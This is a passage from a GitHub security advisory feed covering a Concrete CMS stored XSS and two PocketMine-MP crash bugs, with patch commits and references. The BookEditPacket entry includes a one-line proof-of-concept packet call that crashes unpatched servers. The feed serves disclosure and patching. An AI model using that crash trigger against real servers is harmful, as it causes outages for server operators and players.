<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48650">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>
<li><a href="https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>
<li><a href="https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>
<li><a href="https://github.com/advisories/GHSA-x577-gcc9-9xjj">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x577-gcc9-9xjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4m7h-34xm-4wjv</id>
        <link href="https://github.com/advisories/GHSA-4m7h-34xm-4wjv"/>
        <updated>2024-03-06T17:05:06.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS version 9 before 9.2.7 is vulnerable to Stored XSS via the Name field of a Group type since there is insufficient validation of administrator provided data for that field. A rogue administrator could inject malicious code into the Name field which might be executed when users visit the affected page. The Concrete CMS security team gave this vulnerability a CVSS v3.1 score of 2.2 with a vector of AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N  Concrete versions below 9 do not include group types so they are not affected by this vulnerability. Thanks Luca Fuda for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2179">https://nvd.nist.gov/vuln/detail/CVE-2024-2179</a></li>
<li><a href="https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes">https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4">https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4</a></li>
<li><a href="https://github.com/advisories/GHSA-4m7h-34xm-4wjv">https://github.com/advisories/GHSA-4m7h-34xm-4wjv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m7h-34xm-4wjv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-05T21:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/pocketmine-mp] PocketMine-MP server crash with certain invalid JSON payloads in `LoginPacket` due to dependency vulnerability (3rd time)]]></title>
        <id>https://github.com/advisories/GHSA-h6j3-j35f-v2x7</id>
        <link href="https://github.com/advisories/GHSA-h6j3-j35f-v2x7"/>
        <updated>2024-03-06T17:02:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker could crash the server by sending malformed JWT JSON in LoginPacket due to a security vulnerability in <a href="https://github.com/cweiske/JsonMapper">netresearch/jsonmapper</a>, due to attempting to construct objects from scalar types by default without any validation, with unexpected results that caused PocketMine-MP to crash.</p>
<p>Due to the relatively high number of security issues arising from this specific dependency, the team is exploring options to replace it.</p>
<h3 id="patches">Patches</h3>
<p>In the meantime, the issue was fixed by pmmp/netresearch-jsonmapper@b96a209f9e8b76b899a0d0918493cd87eb3c02a7 and 6872661fd03649cc7a8762c41c16e9ee5a4de1c9.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Detecting the malicious data that triggers this issue is of rather high difficulty, so it's not likely that a plugin would be able to easily remediate this.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/cweiske/jsonmapper/issues/226">https://github.com/cweiske/jsonmapper/issues/226</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7</a></li>
<li><a href="https://github.com/cweiske/jsonmapper/issues/226">https://github.com/cweiske/jsonmapper/issues/226</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9">https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9</a></li>
<li><a href="https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7">https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7</a></li>
<li><a href="https://github.com/advisories/GHSA-h6j3-j35f-v2x7">https://github.com/advisories/GHSA-h6j3-j35f-v2x7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6j3-j35f-v2x7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:02:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/pocketmine-mp] PocketMine-MP BookEditPacket crash when inventory slot in the packet is invalid]]></title>
        <id>https://github.com/advisories/GHSA-xc7j-wj36-qjfr</id>
        <link href="https://github.com/advisories/GHSA-xc7j-wj36-qjfr"/>
        <updated>2024-03-06T17:01:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a client sends a BookEditPacket with InventorySlot greater than 35, the server will crash due to an unhandled exception thrown by <code>BaseInventory-&gt;getItem()</code>.</p>
<h3 id="details">Details</h3>
<p>Crashes at <a href="https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></p>
<h3 id="poc">PoC</h3>
<p>Using Gophertunnel, use <code>serverConn.WritePacket(&amp;packet.BookEdit{InventorySlot: 36})</code></p>
<h3 id="impact">Impact</h3>
<p>Server crash, all servers</p>
<h3 id="patched-versions">Patched versions</h3>
<p>This issue was fixed by 47f011966092f275cc1b11f8de635e89fd9651a7, and the fix was released in 5.11.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7">https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></li>
<li><a href="https://github.com/advisories/GHSA-xc7j-wj36-qjfr">https://github.com/advisories/GHSA-xc7j-wj36-qjfr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xc7j-wj36-qjfr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:01:27.000Z</published>
    </entry>
</feed>